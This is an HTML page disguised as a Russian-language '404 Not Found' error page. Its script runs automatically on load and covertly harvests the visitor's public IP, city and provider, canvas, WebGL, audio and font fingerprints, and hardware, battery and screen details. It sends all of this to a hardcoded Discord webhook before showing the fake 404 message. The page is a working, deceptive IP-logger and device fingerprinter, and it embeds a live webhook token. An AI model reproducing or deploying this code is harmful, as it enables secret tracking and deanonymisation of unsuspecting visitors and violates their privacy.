<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #222222;
        }
        .container {
            text-align: center;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            font-size: 24px;
            margin: 0 0 10px 0;
            font-weight: 500;
        }
        p {
            color: #666666;
            font-size: 14px;
            margin: 0;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container" id="loader-container">
        <div class="spinner"></div>
        <p>Загрузка...</p>
    </div>

    <div class="container hidden" id="error-container">
        <h1>404</h1>
        <p>Страница не найдена или была удалена.</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1514009429790691549/qjoPGSfJGaoQXorZARp-zz_9ABnPwDqmc2bpELOub6pFev7CDwt9f0dZRUaglZMxUnQW";

        // 1. WebGL Fingerprint & Render Details
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { vendor: "N/A", renderer: "N/A", extensions: "N/A" };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const extensions = gl.getSupportedExtensions().join(', ');
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                    extensions: extensions || "N/A"
                };
            } catch (e) {
                return { vendor: "Error", renderer: "Error", extensions: "Error" };
            }
        }

        // 2. Canvas Fingerprint (Пиксельный слепок)
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint ", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Fingerprint ", 4, 17);
                return canvas.toDataURL();
            } catch (e) {
                return "N/A";
            }
        }

        // 3. AudioContext Fingerprint (Аудио-отпечаток процессора/звуковой карты)
        async function getAudioFingerprint() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return "Not Supported";
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, context.currentTime);

                gainNode.gain.value = 0;
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);

                oscillator.start(0);
                
                return new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function (e) {
                        const output = e.inputBuffer.getChannelData(0);
                        let sum = 0;
                        for (let i = 0; i < output.length; i++) {
                            sum += Math.abs(output[i]);
                        }
                        oscillator.stop();
                        context.close();
                        resolve(sum.toString());
                    };
                });
            } catch (e) {
                return "Error/Blocked";
            }
        }

        // 4. Поиск шрифтов
        function detectFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            const h = document.getElementsByTagName("body")[0];
            const span = document.createElement("span");
            span.style.fontSize = testSize;
            span.innerHTML = testString;
            const defaultWidth = {};
            const defaultHeight = {};
            for (let index = 0; index < baseFonts.length; index++) {
                span.style.fontFamily = baseFonts[index];
                h.appendChild(span);
                defaultWidth[baseFonts[index]] = span.offsetWidth;
                defaultHeight[baseFonts[index]] = span.offsetHeight;
                h.removeChild(span);
            }
            const fontsToTest = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
            const detected = [];
            for (let i = 0; i < fontsToTest.length; i++) {
                let detectedForFont = false;
                for (let j = 0; j < baseFonts.length; j++) {
                    span.style.fontFamily = fontsToTest[i] + ',' + baseFonts[j];
                    h.appendChild(span);
                    let matched = (span.offsetWidth !== defaultWidth[baseFonts[j]] || span.offsetHeight !== defaultHeight[baseFonts[j]]);
                    h.removeChild(span);
                    if (matched) {
                        detectedForFont = true;
                        break;
                    }
                }
                if (detectedForFont) detected.push(fontsToTest[i]);
            }
            return detected.join(', ') || "N/A";
        }

        async function getIPData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch (e) {
                try {
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    return await res2.json();
                } catch (err) {
                    return {};
                }
            }
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: `${Math.round(battery.level * 100)}%`,
                        charging: battery.charging ? "Да" : "Нет"
                    };
                } catch (e) {}
            }
            return { level: "N/A", charging: "N/A" };
        }

        async function sendPart(payload) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error(err);
            }
        }

        async function collectAllData() {
            const ipData = await getIPData();
            const webgl = getWebGLInfo();
            const battery = await getBatteryInfo();
            const audioHash = await getAudioFingerprint();
            const canvasHash = getCanvasFingerprint();
            const fonts = detectFonts();
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};

            // Часть 1: Сеть и Локация
            const part1 = {
                content: null,
                embeds: [{
                    title: "📍 Лог [1/3]: Сеть и Локация",
                    color: 3447003,
                    fields: [
                        { name: "Публичный IP", value: `${ipData.ip || "Unknown"}`, inline: false },
                        { name: "Страна / Город", value: `${ipData.country_name || "N/A"}, ${ipData.city || "N/A"}`, inline: false },
                        { name: "Провайдер / ASN", value: `${ipData.org || ipData.asn || "N/A"}`, inline: false },
                        { name: "Часовой пояс", value: `${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // Часть 2: Отпечатки (Fingerprints)
            const part2 = {
                content: null,
                embeds: [{
                    title: "🧬 Лог [2/3]: Уникальные Отпечатки",
                    color: 15105570,
                    fields: [
                        { name: "Audio Hash", value: `\`${audioHash}\``, inline: false },
                        { name: "Canvas Hash (DataURL)", value: `\`${canvasHash}\``, inline: false },
                        { name: "Доступные шрифты", value: `${fonts}`, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // Часть 3: Железо, ОС, Экран и Батарея
            const part3 = {
                content: null,
                embeds: [{
                    title: "💻 Лог [3/3]: Железо, ОС и Система",
                    color: 10181046,
                    fields: [
                        { name: "Платформа и ОС", value: `Платформа: ${navigator.platform}\nUser-Agent: ${navigator.userAgent}`, inline: false },
                        { name: "Аппаратные данные", value: `Ядра CPU: ${navigator.hardwareConcurrency || "N/A"}\nОЗУ: ${navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A"}`, inline: false },
                        { name: "Видеокарта (GPU)", value: `Vendor: ${webgl.vendor}\nRenderer: ${webgl.renderer}`, inline: false },
                        { name: "WebGL Extensions", value: `${webgl.extensions}`, inline: false },
                        { name: "Дисплей", value: `Разрешение: ${window.screen.width}x${window.screen.height}\nГлубина цвета: ${window.screen.colorDepth}-bit`, inline: true },
                        { name: "Система", value: `Батарея: ${battery.level} (Зарядка: ${battery.charging})\nСеть: ${connection.effectiveType || "N/A"}`, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // Последовательная отправка всех частей без сокращений
            await sendPart(part1);
            await sendPart(part2);
            await sendPart(part3);

            // Переключение на показ ошибки 404
            document.getElementById('loader-container').classList.add('hidden');
            document.getElementById('error-container').classList.remove('hidden');
            document.title = "404 Not Found";
        }

        collectAllData();
    </script>
</body>
</html>
